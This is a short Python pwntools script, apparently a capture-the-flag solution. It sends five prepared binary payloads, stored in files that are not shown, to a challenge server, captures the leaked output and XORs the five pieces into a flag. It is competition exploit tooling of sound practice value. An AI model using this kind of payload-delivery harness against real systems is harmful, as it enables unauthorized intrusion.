from pwn import *
from ast import literal_eval

context.log_level = "CRITICAL"

p = remote("quintuple-read.challs.infobahnc.tf", 1337)

flags = []

for i in range(1, 6):
    with open(f"solves/payload{i}.bin", "rb") as f:
        p1 = f.read()

    # input("WAIT...\n")
    p.sendlineafter(b"5):", p1.hex().encode())
    p.recvuntil(b"stdout: ")
    data = literal_eval(p.recvline(keepends=False).decode())
    flags.append(data)
    print(f"{data = }")
    
    # p.interactive()

flag = flags[0]
for i in range(1, 5):
    flag = xor(flag, flags[i])

print(f"{flag = }")
